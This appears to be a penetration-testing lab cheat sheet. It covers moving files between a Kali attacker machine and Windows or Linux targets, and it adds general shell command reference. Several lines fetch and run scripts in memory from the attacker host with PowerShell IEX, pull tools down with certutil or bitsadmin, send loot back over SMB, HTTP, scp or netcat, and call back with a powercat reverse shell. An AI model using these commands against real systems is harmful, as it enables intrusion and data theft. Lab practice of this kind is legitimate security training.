
# Windows and Linux shell cmd line quick reference

handy commands organised for quick reference 

**Example Network**  

| Machine         | IP               |
| --------------- | ---------------- |
| Kali (attacker) | 192.168.xx.xxx   |
| Alice (target)  | 192.168.111.137  |

## File Transfer
### Kali -> Windows 

PS 
1. outbound HTTP is allowed
2. user can write to the destination path / check ACLs on folder 

common writable paths: 
```
C:\Users\Public\  
C:\Windows\Temp\  
C:\Temp\
```

cmd
```
icacls C:\Users\Public
```

PS
```powershell
PS C:\users\public> Get-Acl C:\Users\Public | Format-List
```

test write access
cmd
```
echo test > C:\Users\Public\test.txt  
dir C:\Users\Public\test.txt
```

PS
```powershell
PS C:\users\public> "test" | Out-File C:\Users\Public\test.txt
PS C:\users\public> dir C:\Users\Public\test.txt
```

Kali: Serve file on HTTP server 
```bash
python3 -m http.server 80

# If port 80 is unavailable and you want to stop the service running on it
sudo systemctl stop apache2

# check status
sudo systemctl status apache2

# If port 80 is unavailable and you want to open a different port
python3 -m http.server 8000
```

#### PS `Invoke-WebRequest` method
```powershell
PS C:\users\public> iwr -Uri http://192.168.xx.xxx/PowerView.ps1 -OutFile PowerView.ps1
```
- `iwr` = built-in cmdlet

#### PS `WebClient` method

PS language mode check
note: `ConstrainedLanguage` blocks `WebClient` method
```powershell
PS C:\users\public> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

`ConstrainedLanguage` 
- commonly restricts or interferes with: 
- restricted: 
	- in-memory script loading
	- complex .NET-based scripting

if not blocked...! 
```powershell
PS C:\users\public> $wc = New-Object System.Net.WebClient
PS C:\users\public> $wc.DownloadFile("http://192.168.xx.xxx/file.exe", "C:\Users\Public\file.exe")
```

PS in-memory execution 
```powershell
PS C:\users\public> IEX (New-Object System.Net.WebClient).DownloadString("http://192.168.xx.xxx/PowerView.ps1")
PS C:\users\public>
PS C:\users\public> Get-DomainUser
```

- useful if `iwr` unavailable
- works for in-memory script execution (in current session) without writing to disk first 
- if blank output -> likely success 

#### SMB share  on Kali

kali: start SMB share
```bash
impacket-smbserver share . -smb2support -username kira -password kira
```

copy Kali -> Win
cmd
```
copy \\kali_ip\share\winPEAS.exe C:\Users\Public\winPEAS.exe
```

PS - map to drive first
```powershell
PS C:\Users\Public> net use Z: \\kali_ip\share /user:username password
PS C:\Users\Public> copy Z:\winPEAS.exe C:\Users\Public\winPEAS.exe
```

#### certutil 
- fallback option if iwr does not work
```
certutil -urlcache -f http://kali_ip/winPEAS.exe winPEAS.exe
```

#### curl 
- modern window hosts 
```
curl.exe http://kali_ip/winPEAS.exe -o winPEAS.exe
```

#### bitsadmin
- fallback option 
```
bitsadmin /transfer myJob /download /priority normal http://kali_ip/winPEAS.exe C:\Users\Public\winPEAS.exe
```


### Windows -> Kali  

#### SMB share 

```bash
└─$ impacket-smbserver test . -smb2support -username kira -password kira   
```

map and copy Win -> Kali
```powershell
PS C:\Users\Public> net use m: \\192.168.xx.xxx\TEST /user:kira kira

PS C:\Users\Public> copy system.save m:\
```

#### PSUpload using HTTP
- if SMB blocked but HTTP upload allowed
- [PSUpload.ps1 on Github Repo](https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1) 

Kali:
```bash
└─$ pwd                      
/home/kira/oscp/exploits
└─$ source venv/bin/activate
└─$ pip3 install uploadserver  
└─$ python3 -m uploadserver 8000
```

Win:
```powershell
PS C:\Users\Public> IEX (New-Object Net.WebClient).DownloadString("")

IEX (New-Object Net.WebClient).DownloadString("http://kali_ip/PSUpload.ps1")  
Invoke-FileUpload -Uri http://kali_ip:8000/upload -File C:\Users\Public\winPEAS.exe

Invoke-FileUpload -Uri http://kali_ip/upload -File C:\Users\Public\winPEAS.exe
```

### Linux -> Linux

**Kali -> Linux** 
```bash
wget http://kali_ip/linpeas.sh -O /tmp/linpeas.sh
curl http://kali_ip/linpeas.sh -o /tmp/linpeas.sh

python3 -c "import urllib.request; urllib.request.urlretrieve('http://kali_ip/linpeas.sh','/tmp/linpeas.sh')"
```

#### SMB client

Kali start SMB server from directory to be shared
```bash
└─$ impacket-smbserver exploits . -smb2support -username kali -password kali
```

Target linux host connect to Kali SMB Share
```bash
└─$ smbclient //kali_ip/exploits -U kali
```

**Kali -> Linux**

```bash
└─$ smbclient //kali_ip/exploits -U kali

Password for [WORKGROUP\kali]:  
Try "help" to get a list of possible commands.  

smb: \> lcd /home/kali/loot
smb: \> get linpeas.sh
getting file \linpeas.sh of size 847512 as linpeas.sh (1034.2 KiloBytes/sec) (average 1034.2 KiloBytes/sec)
smb: \> exit
```

**Linux -> Kali**

note: for `put` kali shared Kali directory must be writable by server process -> check on kali
```bash
cd /home/kali/oscp-share  
touch testfile
```

```bash
└─$ smbclient //kali_ip/exploits -U kali

Password for [WORKGROUP\kali]:  
Try "help" to get a list of possible commands.  

smb: \> put loot.txt  
putting file loot.txt as \loot.txt (12.4 kb/s) (average 12.4 kb/s)
smb: \> exit
```

Useful interactive commands:  
```bash  
ls  
cd <remote_dir>  
lcd /path/to/local/dir #-> downloaded files go into `/path/to/local/dir` in kali
get file.txt  
put file.txt  
mget *  
mput *  
exit  
```

#### scp 
- if ssh available on target machine linux

Kali: enable ssh
```bash
sudo systemctl enable ssh  
sudo systemctl start ssh  
sudo systemctl status ssh --no-pager

# optional checks
ss -ltnp | grep :22  
ip addr
```

Target: 
```bash
scp /tmp/loot.txt kali@kali_ip:/tmp/

# if ssh is on non-default port (not 22)
scp -P 2222 /tmp/loot.txt kali@kali_ip:/tmp/

# verify if login works 
ssh kali@kali_ip
```

#### netcat (nc)

Target -> Kali
Kali: 
```bash
nc -lvnp 4444 > loot.txt
listening on [any] 4444 ...  
connect to [192.168.45.xxx] from (UNKNOWN) [192.168.111.137] 51542
```

Target:
```bash
nc 192.168.45.xxx 4444 < loot.txt
```

Kali -> Target
Target:
```bash
nc -lvnp 4444 > loot.txt
```

Kali:
```bash
nc 192.168.111.137 4444 < loot.txt
```

## Windows cmd reference

### Find flag or Specific File  

PS
```powershell
# powershell
Get-ChildItem -Path C:\ -Filter flag.txt -Recurse -ErrorAction SilentlyContinue

# find proof
Get-ChildItem -Path C:\ -Filter proof.txt -Recurse -ErrorAction SilentlyContinue

# find local
Get-ChildItem -Path C:\ -Filter local.txt -Recurse -ErrorAction SilentlyContinue
```

cmd
```cmd
dir C:\flag.txt /s /b
```

###  Copy command 

PS 
```powershell
PS C:\Users\public> Copy-Item C:\Users\username\Documents\file.exe -Destination C:\Users\Public\file.exe

# PS with spaces in path 
PS C:\Users\public> Copy-Item "C:\Users\username\My Documents\file.exe" -Destination "C:\Users\Public\file.exe"
```

cmd 
```cmd
copy C:\Users\username\Documents\file.exe C:\Users\Public\file.exe

# cmd with spaces in path 
copy "C:\Users\username\My Documents\file.exe" "C:\Users\Public\file.exe"
```

### Create new directory

```powershell
PS C:\users\public> New-Item -ItemType Directory -Path C:\Users\public\logs
```

# Linux cmd reference

### Find flag or Specific File  

```bash
# search the full filesystem for `flag.txt`
└─$ find / -name flag.txt 2>/dev/null
└─$ find / -name local.txt 2>/dev/null  
└─$ find / -name proof.txt 2>/dev/null

# search only under `/home`
└─$ find /home -name flag.txt 2>/dev/null
└─$ find /home -name local.txt 2>/dev/null  
└─$ find /home -name proof.txt 2>/dev/null

#case insensitive search
└─$ find / -iname flag.txt 2>/dev/null
```

find specific file types 
```bash
└─$ find / -name "*.txt" 2>/dev/null
└─$ find / -name "*.pdf" 2>/dev/null
```

#### Find Unix special permission bits

| Bit  | Name   | Meaning                                               |
| ---- | ------ | ----------------------------------------------------- |
| 4000 | SUID   | Run with the file owner's privileges                  |
| 2000 | SGID   | Run with the file group's privileges                  |
| 1000 | Sticky | Restrict file deletion in shared writable directories |

find  files with the SUID bit set
- SUID (Set User ID) binaries = executables that run with the privileges of the file owner rather than the current user.
```bash
└─$ find / -perm -4000 2>/dev/null  
└─$ find / -perm -2000 2>/dev/null
└─$ ls -l /path/to/binary  
└─$ stat /path/to/binary  
└─$ file /path/to/binary
```

SUID example of `passwd` command used to change passwords
```bash
└─$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 68248 Apr  1 12:34 /usr/bin/passwd

└─$ stat /usr/bin/passwd
  File: /usr/bin/passwd
  Size: 68248     	Blocks: 136        IO Block: 4096   regular file
Device: 802h/2050d	Inode: 131072      Links: 1
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
...
 
└─$ file /usr/bin/passwd
/usr/bin/passwd: setuid ELF 64-bit LSB pie executable, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=abc123..., for GNU/Linux 3.2.0, stripped
```

- `Access: (4755/-rwsr-xr-x)` confirms:
    - `4` = SUID bit set
    - `755` = normal rwx/rx/rx permissions
- `Uid: root`
- `Gid: root`

- `setuid` confirms the SUID behavior
- `ELF 64-bit` means it is a native Linux binary
- `dynamically linked` means it uses shared libraries
- `stripped` means symbol/debug info was removed

sticky bit example
```bash
└─$ ls -ld /tmp
drwxrwxrwt 10 root root 4096 Apr 20 12:00 /tmp
```
- `----------t` -> sticky bit set and user cannot delete or rename another user’s files
- in shared writable directories  (e.g `/tmp`) ->  users usually cannot delete or rename files owned by other users

### file & stat = inspect binaries, scripts, and permissions

```bash
└─$ stat /usr/bin/passwd
└─$ file /usr/bin/passwd
```

```bash
└─$ stat /usr/bin/passwd
  File: /usr/bin/passwd
  Size: 68248     	Blocks: 136        IO Block: 4096   regular file
Device: 802h/2050d	Inode: 131072      Links: 1
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
...
 
└─$ file /usr/bin/passwd
/usr/bin/passwd: setuid ELF 64-bit LSB pie executable, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=abc123..., for GNU/Linux 3.2.0, stripped
```

### Find files and directories the current user can write to

```bash 
└─$ find / -writable 2>/dev/null
```

### chmod linux permissions 

run  [`chmod_calc.sh`](./scripts/chmod_calc.sh)  to lookup chmod permissions fast in terminal

make it executable as always
```bash
└─$ chmod +x chmod_calc.sh
```

search by octal
```bash
└─$ ./chmod_calc.sh 4755      
Input:        4755
Type:         Octal
Symbolic:     rwsr-xr-x
Special bits: SUID

Owner   rws -> read write execute + special bit
Group   r-x -> read execute
Other   r-x -> read execute
```

search by symbolic
```bash
└─$ ./chmod_calc.sh -rwsr-xr-x
Input:        -rwsr-xr-x
Type:         Symbolic
File type:    -
Octal:        4755
Special bits: SUID

Owner   rws -> read write execute + special bit
Group   r-x -> read execute
Other   r-x -> read execute
```

[online chmod calculator](https://chmod-calculator.com/)

change chmod permissions
```bash
# quick execution - just run your own script
chmod +x script.sh

# private tool/script - only you to read/write/execute
chmod 700 script.sh  

# general shared script - readable/executable by others
chmod 755 script.sh  
```

### save command output 

stdout cmd output to textfile 
```bash
# save both standard output and standard error to a file
└─$ commandhere > output.txt 2>&1

# append cmd output to existing file 
└─$ commandhere >> output.txt 2>&1  
```
- 2>&1 sends stderr to same place as stdout 

view output in the terminal and save it at the same time
```bash
└─$ commandhere | tee output.txt

# append cmd output to existing file 
└─$ commandhere | tee -a output.txt
```

### tail show end of file

tail defaults to showing 10 last lines of file
```bash
└─$ tail /etc/proxychains4.conf                                     
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5 127.0.0.1 1080
```

show last 5 lines
```bash
tail -n 5 /etc/proxychains4.conf
```

read bottom x lines and filter for keyword 
```bash
tail -n 20 file.txt | grep "admin"
```

### less = read large files in terminal

```bash
less /etc/crontab  
less /var/log/auth.log
```

### grep 

search for key word in file 
```bash
grep "password" file.txt

# case-insensitive search
grep -i "password" file.txt
```

recursive search through directory
```bash
grep -R "DB_PASSWORD" /var/www 2>/dev/null
```

show line numbers
```bash
grep -n "listen" /etc/nginx/nginx.conf
```

filter command output from cmd output to filter noisy output 
```bash
ps aux | grep apache
```

### curl

download file with curl to output
```bash
curl http://kali_ip/file.sh -o /tmp/file.sh
```

or wget to download file
```bash
wget http://kali_ip/file.sh -O /tmp/file.sh
```

### tar & zip
- useful to archive tools to compress, extract, and move groups of files

create tar archvie
```bash
tar -cvf loot.tar loot/
```

extract tar archive 
```bash
tar -xvf loot.tar
```

create gzipped tar archive
```bash
tar -czvf loot.tar.gz loot/
```

extract gzipped tar archive
```bash
tar -xzvf loot.tar.gz
```

create zip archive
```bash
zip -r loot.zip loot/
```

extract zip archive
```bash
unzip loot.zip
```

### which, whereis, type = show where commands are on sys

find command path
```bash
└─$ which python                            
/usr/bin/python
```


```bash
└─$ whereis ssh 
ssh: /usr/bin/ssh /etc/ssh /usr/share/man/man1/ssh.1.gz
```

check if sth is an alias, builtin, function, or file
```bash
└─$ type python
python is /usr/bin/python

└─$ type ls                                                     
ls is an alias for ls --color=auto
```

### history

show command history
```bash
└─$ history                                                                    
 1877  nc -nvlp 443
...
 2973  type ls
 2974  type python
 2975  which python
 2976  whereis ssh
```

filter for keyword
```bash
└─$ history | grep ssh
 2106  crackmapexec ssh 192.168.111.137 -u alice -p "alice_password" 
 2474  crackmapexec ssh 192.168.111.138 -u bob -p "bob_password" 
 2976  whereis ssh
```


### ss = inspect ports
- inspect listening ports &  identify which process owns them

show listening TCP/UDP sockets with process information
```bash
└─$ sudo ss -tulpn
```

see which process is listening on a specific port
```bash
└─$ sudo ss -tulpn | grep :8080
tcp   LISTEN 0      50      [::ffff:127.0.0.1]:8080      *:*    users:(("java",pid=1607424,fd=37))
```

### ps = inspect process details using PID

see info on running processes using PID 
```bash
└─$ ps -p 1607424 -f
UID          PID    PPID  C STIME TTY          TIME CMD
username  1607424    2925  1 Apr23 tty2     00:25:34 java -jar /usr/share/burpsuite/burpsuite.jar
```

### xfreerdp
- connect to RDP services from linux -> windows
```bash
└─$ xfreerdp /u:alice /p:'alice_password' /d:domain.com /v:192.168.111.137 /drive:shared,/tmp
```

### sanitize ascii spaces in payload
- check for hidden / non-standard spaces in payloads
```bash
└─$ echo 'powercat -c 192.168.xx.xxx -p 4444 -e powershell' | xxd
```

### sort, uniq, wc to cleanup files

sort lines alphabetically
```bash
sort users.txt

# sort and remove dupliates
sort -u users.txt

# count unique values
sort users.txt | uniq -c
```

count 
```bash
└─$ wc users.txt
5 5 30 users.txt 
```
- 5 lines |  5 words | 30 bytes

```bash
# count lines
wc -l users.txt

# count bytes  
wc -c file.bin

# count words
wc -w file.txt

# count characters
wc -m file.txt
```

### cut, awk = reformat fields from cmd output


```bash
└─$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
kali:x:1000:1000:kali:/home/kali:/bin/bash

└─$ cut -d: -f1 /etc/passwd
root  
www-data  
kali
```
- `-d:` → use `:` as the delimiter
- `-f1` → print field 1

print selected columns 
```bash
awk '{print $1, $2}' file.txt
```

```bash
└─$ cat file.txt
10.10.10.5 apache Ubuntu
10.10.10.10 mysql Debian
10.10.10.15 ftp Windows

awk '{print $1, $2}' file.txt
10.10.10.5 apache
10.10.10.10 mysql
10.10.10.15 ftp
```

replace characters
```bash
# `-F'\\'` : use `\` as field separator 
└─$ printf '%s\n' 'DOMAIN\alice' 'DOMAIN\bob' | awk -F'\\' '{print $2}' | sort -u
alice
bob

└─$ printf '%s\n' 'DOMAIN\\alice' 'DOMAIN\\bob' | awk '{sub(/^.*\\\\/,""); print}' | sort -u
alice
bob

└─$ printf '%s\n' 'DOMAIN//alice' 'DOMAIN//bob' | awk '{sub(/^.*\/\//,""); print}' | sort -u
alice
bob

└─$ printf '%s\n' 'DOMAIN\\alice' 'DOMAIN\\bob' | sed 's#.*\\\\##' | sort -u
alice
bob
```

### pgrep, pkill = process lookup and cleanup

find PID by process name
```bash
# show PID and Process name
└─$ pgrep -a ssh
1042 ssh-agent  
2218 ssh
```

kill process
```bash
└─$ pkill ssh
# no output -> success

└─$ pgrep -a ssh
1042 ssh-agent
# pkill ssh killed ssh but not ssh-agent
```

good practice
```bash
# show PID and full command line
└─$ pgrep -af chisel
2871 ./chisel client 10.10.10.5:8000 R:socks
└─$ pkill -f chisel  
└─$ pgrep -af chisel
# no output -> success
```


### activate python env

```bash
└─$ python3 -m venv venv
└─$ source venv/bin/activate
└─$ deactivate 
```

### pdf compression

`gs` (Ghostscript) to reduce pdf size when preparing reports or upload-limited submissions

```bash
└─$ gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/ebook \
   -dNOPAUSE -dQUIET -dBATCH -sOutputFile=fotos_compressed.pdf fotos.pdf
```






